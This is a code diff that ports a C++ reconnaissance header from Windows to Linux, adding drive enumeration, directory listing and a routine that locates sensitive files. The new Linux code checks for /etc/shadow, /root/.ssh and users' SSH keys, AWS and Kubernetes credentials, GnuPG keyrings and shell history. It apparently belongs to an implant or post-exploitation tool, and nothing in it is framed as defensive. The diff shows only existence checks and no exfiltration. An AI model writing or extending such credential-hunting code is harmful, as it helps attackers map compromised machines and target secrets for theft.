@@ -5,10 +5,17 @@
 //  Enumerate logical drives, traverse directories, locate sensitive files.
 // ============================================================================
 
-#ifndef WIN32_LEAN_AND_MEAN
-#define WIN32_LEAN_AND_MEAN
+#ifdef _WIN32
+    #ifndef WIN32_LEAN_AND_MEAN
+    #define WIN32_LEAN_AND_MEAN
+    #endif
+    #include <windows.h>
+#else
+    #include <dirent.h>
+    #include <sys/stat.h>
+    #include <sys/statvfs.h>
+    #include <unistd.h>
 #endif
-#include <windows.h>
 #include <string>
 #include <vector>
 #include <sstream>
@@ -24,7 +31,8 @@ struct DriveInfo {
     uint64_t freeBytes;
 };
 
-inline std::string drive_type_str(UINT type) {
+inline std::string drive_type_str(unsigned int type) {
+#ifdef _WIN32
     switch (type) {
         case DRIVE_REMOVABLE: return "Removable";
         case DRIVE_FIXED:     return "Fixed";
@@ -33,10 +41,14 @@ inline std::string drive_type_str(UINT type) {
         case DRIVE_RAMDISK:   return "RAMDisk";
         default:              return "Unknown";
     }
+#else
+    return "Filesystem";
+#endif
 }
 
 inline std::vector<DriveInfo> enumerate_drives() {
     std::vector<DriveInfo> drives;
+#ifdef _WIN32
     char buf[512];
     DWORD len = GetLogicalDriveStringsA(sizeof(buf), buf);
     if (len == 0 || len > sizeof(buf)) return drives;
@@ -55,6 +67,20 @@ inline std::vector<DriveInfo> enumerate_drives() {
         }
         drives.push_back(di);
     }
+#else
+    DriveInfo di;
+    di.letter = "/";
+    di.type = "Root FS";
+    di.totalBytes = 0;
+    di.freeBytes = 0;
+    
+    struct statvfs stat;
+    if (statvfs("/", &stat) == 0) {
+        di.totalBytes = stat.f_blocks * stat.f_frsize;
+        di.freeBytes = stat.f_bavail * stat.f_frsize;
+    }
+    drives.push_back(di);
+#endif
     return drives;
 }
 
@@ -68,6 +94,7 @@ struct FileEntry {
 
 inline std::vector<FileEntry> list_directory(const std::string& path) {
     std::vector<FileEntry> entries;
+#ifdef _WIN32
     std::string searchPath = path;
     if (searchPath.back() != '\\') searchPath += '\\';
     searchPath += '*';
@@ -88,6 +115,34 @@ inline std::vector<FileEntry> list_directory(const std::string& path) {
     } while (FindNextFileA(hFind, &fd));
 
     FindClose(hFind);
+#else
+    DIR *dir = opendir(path.c_str());
+    if (!dir) return entries;
+    
+    struct dirent *ent;
+    while ((ent = readdir(dir)) != NULL) {
+        std::string name = ent->d_name;
+        if (name == "." || name == "..") continue;
+        
+        FileEntry fe;
+        fe.name = name;
+        fe.size = 0;
+        
+        std::string fullPath = path;
+        if (fullPath.back() != '/') fullPath += '/';
+        fullPath += name;
+        
+        struct stat st;
+        if (stat(fullPath.c_str(), &st) == 0) {
+            fe.isDir = S_ISDIR(st.st_mode);
+            if (!fe.isDir) fe.size = st.st_size;
+        } else {
+            fe.isDir = (ent->d_type == DT_DIR);
+        }
+        entries.push_back(fe);
+    }
+    closedir(dir);
+#endif
     return entries;
 }
 
@@ -97,7 +152,7 @@ inline std::vector<FileEntry> list_directory(const std::string& path) {
 inline std::vector<std::string> find_critical_paths() {
     std::vector<std::string> found;
     
-    // Paths to check for existence
+#ifdef _WIN32
     const char* interesting[] = {
         "C:\\Users",
         "C:\\Windows\\System32\\config",
@@ -116,7 +171,6 @@ inline std::vector<std::string> find_critical_paths() {
         }
     }
 
-    // Enumerate user profile directories
     char userProfile[MAX_PATH];
     if (GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH)) {
         std::string up = userProfile;
@@ -134,6 +188,39 @@ inline std::vector<std::string> find_critical_paths() {
             }
         }
     }
+#else
+    const char* interesting[] = {
+        "/etc/passwd",
+        "/etc/shadow",
+        "/etc/hosts",
+        "/var/www/html",
+        "/root/.ssh",
+        "/opt",
+        "/tmp",
+        nullptr
+    };
+
+    for (int i = 0; interesting[i]; ++i) {
+        if (access(interesting[i], F_OK) == 0) {
+            found.push_back(interesting[i]);
+        }
+    }
+
+    const char* home = getenv("HOME");
+    if (home) {
+        std::string h = home;
+        const char* subDirs[] = {
+            "/.ssh", "/.aws", "/.kube", "/.gnupg", "/.bash_history",
+            nullptr
+        };
+        for (int i = 0; subDirs[i]; ++i) {
+            std::string full = h + subDirs[i];
+            if (access(full.c_str(), F_OK) == 0) {
+                found.push_back(full);
+            }
+        }
+    }
+#endif
     return found;
 }
 
